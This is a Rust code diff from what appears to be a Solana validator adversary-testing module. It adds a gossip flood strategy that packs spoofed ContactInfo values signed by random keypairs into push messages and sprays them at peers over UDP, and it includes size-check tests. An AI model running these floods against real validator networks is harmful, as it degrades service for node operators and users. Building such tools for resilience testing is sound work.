@@ -11,11 +11,16 @@ use {
     rand::seq::SliceRandom,
     rayon::{prelude::*, ThreadPool},
     solana_gossip::{
-        cluster_info::ClusterInfo, contact_info::ContactInfo, crds_data::CrdsData,
-        crds_gossip_pull::CrdsFilter, crds_value::CrdsValue, protocol::Protocol,
+        cluster_info::ClusterInfo,
+        contact_info::ContactInfo,
+        crds_data::CrdsData,
+        crds_gossip_pull::CrdsFilter,
+        crds_value::CrdsValue,
+        protocol::{split_gossip_messages, Protocol},
     },
     solana_keypair::Keypair,
     solana_net_utils::bind_to_unspecified,
+    solana_packet::PACKET_DATA_SIZE,
     solana_signer::Signer,
     solana_streamer::sendmmsg::{batch_send, SendPktsError},
     std::{
@@ -25,6 +30,22 @@ use {
         time::{Duration, Instant},
     },
 };
+
+/// Size of a serialized empty push message:
+/// 'Protocol::PushMessage(Pubkey::default(), Vec::default())'.
+/// This is verified in[`tests::generate_one_serialized_empty_push_message`].
+const PUSH_MESSAGE_EMPTY_SIZE: usize = 44;
+
+/// Payload size of serialized crds-values that fit in a Protocol::PushMessage packet.
+const PUSH_MESSAGE_MAX_PAYLOAD_SIZE: usize = PACKET_DATA_SIZE - PUSH_MESSAGE_EMPTY_SIZE;
+
+/// Number of CRDS values to pack in a push messsage in PushContactInfo gossip
+/// flood attacks. Setting this value greater than 1 ensures the target node
+/// is checking every single CrdsValue within the received PushMessage.
+/// The actual number of CrdsValues packed in a push message is determined at runtime
+/// and affected by the size of customer_info for that node.
+/// This is verified in [`tests::generate_one_serialized_push_message`].
+const NUM_CRDS_VALUES_PER_PUSH_MSG: usize = 10;
 
 pub struct GossipPacketFlood;
 
@@ -71,7 +92,39 @@ impl GossipPacketFlood {
         AdversaryWorkersContext::new(exit, thread_hdls)
     }
 
-    fn flood_ping_cache(
+    fn create_flood_gossip_packet(
+        cluster_info: &ClusterInfo,
+        keypair: &Keypair,
+        flood_strategy: &FloodStrategy,
+    ) -> Vec<u8> {
+        let msg = match flood_strategy {
+            FloodStrategy::PullContactInfo => {
+                let mut self_info = cluster_info.my_contact_info();
+                self_info.adversary_set_pubkey(keypair.pubkey());
+                let self_info = CrdsData::ContactInfo(self_info);
+                let self_info = CrdsValue::new(self_info, keypair);
+                let filter = CrdsFilter::new_rand(10, 1000);
+
+                Protocol::PullRequest(filter, self_info)
+            }
+            FloodStrategy::PushContactInfo => {
+                let mut self_info = cluster_info.my_contact_info();
+                self_info.adversary_set_pubkey(keypair.pubkey());
+                let spam_crds_values = (0..NUM_CRDS_VALUES_PER_PUSH_MSG)
+                    .map(|_| CrdsValue::new(CrdsData::ContactInfo(self_info.clone()), keypair));
+
+                let payloads: Vec<_> =
+                    split_gossip_messages(PUSH_MESSAGE_MAX_PAYLOAD_SIZE, spam_crds_values)
+                        .collect();
+
+                Protocol::PushMessage(keypair.pubkey(), payloads[0].clone())
+            }
+        };
+
+        serialize(&msg).unwrap()
+    }
+
+    fn flood_gossip_attack_generator(
         send_socket: &UdpSocket,
         cluster_info: &ClusterInfo,
         config: &FloodConfig,
@@ -100,13 +153,12 @@ impl GossipPacketFlood {
                             .par_iter()
                             .with_min_len(MIN_PARALLEL_ITEMS)
                             .map(|keypair| {
-                                let mut self_info = cluster_info.my_contact_info();
-                                self_info.adversary_set_pubkey(keypair.pubkey());
-                                let self_info = CrdsData::ContactInfo(self_info);
-                                let self_info = CrdsValue::new(self_info, keypair);
-                                let filter = CrdsFilter::new_rand(10, 1000);
-                                let msg = Protocol::PullRequest(filter, self_info);
-                                let packet_buf = serialize(&msg).unwrap();
+                                let packet_buf = Self::create_flood_gossip_packet(
+                                    cluster_info,
+                                    keypair,
+                                    &config.flood_strategy,
+                                );
+
                                 (packet_buf, peer.gossip().unwrap())
                             })
                     })
@@ -180,16 +232,15 @@ impl GossipPacketFlood {
                 }
             };
 
-            packet_count = packet_count.saturating_add(match config.flood_strategy {
-                FloodStrategy::PingCacheOverflow => Self::flood_ping_cache(
-                    send_socket,
-                    cluster_info,
-                    &config,
-                    &peers,
-                    thread_pool,
-                    keypair_pool,
-                ),
-            });
+            packet_count = packet_count.saturating_add(Self::flood_gossip_attack_generator(
+                send_socket,
+                cluster_info,
+                &config,
+                &peers,
+                thread_pool,
+                keypair_pool,
+            ));
+
             if last_report.elapsed() >= Duration::from_millis(REPORT_INTERVAL_MS) {
                 let num_peers = peers.len();
                 info!(
@@ -205,6 +256,99 @@ impl GossipPacketFlood {
             {
                 return;
             }
+        }
+    }
+}
+
+#[cfg(test)]
+pub mod tests {
+    use {
+        super::GossipPacketFlood,
+        crate::{
+            adversary_feature_set::gossip_packet_flood::FloodStrategy,
+            gossip::{NUM_CRDS_VALUES_PER_PUSH_MSG, PUSH_MESSAGE_EMPTY_SIZE},
+        },
+        bincode::{deserialize, serialize},
+        log::debug,
+        solana_gossip::{cluster_info::ClusterInfo, contact_info::ContactInfo, protocol::Protocol},
+        solana_keypair::Keypair,
+        solana_packet::PACKET_DATA_SIZE,
+        solana_pubkey::Pubkey,
+        solana_signer::Signer,
+        solana_streamer::socket::SocketAddrSpace,
+        solana_time_utils::timestamp,
+        std::sync::Arc,
+    };
+
+    #[test]
+    fn generate_one_serialized_empty_push_message() {
+        let msg = Protocol::PushMessage(Pubkey::default(), Vec::default());
+        let packet_buf = serialize(&msg).unwrap();
+
+        // If this assertion fails, the packet size definition in this file needs
+        // to be updated and will impact push message payload size downstream.
+        assert_eq!(packet_buf.len(), PUSH_MESSAGE_EMPTY_SIZE);
+    }
+
+    #[test]
+    fn generate_one_serialized_pull_request() {
+        let keypair = Arc::new(Keypair::new());
+        let contact_info = ContactInfo::new_localhost(&keypair.pubkey(), timestamp());
+        let cluster_info =
+            ClusterInfo::new(contact_info, keypair.clone(), SocketAddrSpace::Unspecified);
+
+        let packet_buf = GossipPacketFlood::create_flood_gossip_packet(
+            &cluster_info,
+            &keypair,
+            &FloodStrategy::PullContactInfo,
+        );
+
+        debug!("Serialized packet buffer size: {} bytes.", packet_buf.len(),);
+
+        assert!(
+            packet_buf.len() <= PACKET_DATA_SIZE,
+            "Serialized packet buffer size ({} bytes) exceeds the packet size ({} bytes).",
+            packet_buf.len(),
+            PACKET_DATA_SIZE
+        );
+    }
+
+    #[test]
+    fn generate_one_serialized_push_message() {
+        let keypair = Arc::new(Keypair::new());
+        let contact_info = ContactInfo::new_localhost(&keypair.pubkey(), timestamp());
+        let cluster_info =
+            ClusterInfo::new(contact_info, keypair.clone(), SocketAddrSpace::Unspecified);
+
+        let packet_buf = GossipPacketFlood::create_flood_gossip_packet(
+            &cluster_info,
+            &keypair,
+            &FloodStrategy::PushContactInfo,
+        );
+
+        debug!("Serialized packet buffer size: {} bytes.", packet_buf.len());
+
+        assert!(
+            packet_buf.len() <= PACKET_DATA_SIZE,
+            "Serialized packet buffer size: {} bytes exceeds the packet size: {} bytes.",
+            packet_buf.len(),
+            PACKET_DATA_SIZE
+        );
+
+        let msg = deserialize(&packet_buf).unwrap();
+
+        match msg {
+            Protocol::PushMessage(pubkey, crds_values) => {
+                debug!(
+                    "Push message packed {} crds-values for pubkey: {}",
+                    crds_values.len(),
+                    pubkey,
+                );
+                assert_eq!(pubkey, keypair.pubkey());
+                assert!(crds_values.len() <= NUM_CRDS_VALUES_PER_PUSH_MSG);
+                assert_ne!(crds_values, vec![]);
+            }
+            _ => panic!("Expected and actual deserialized push message contents do not match"),
         }
     }
 }
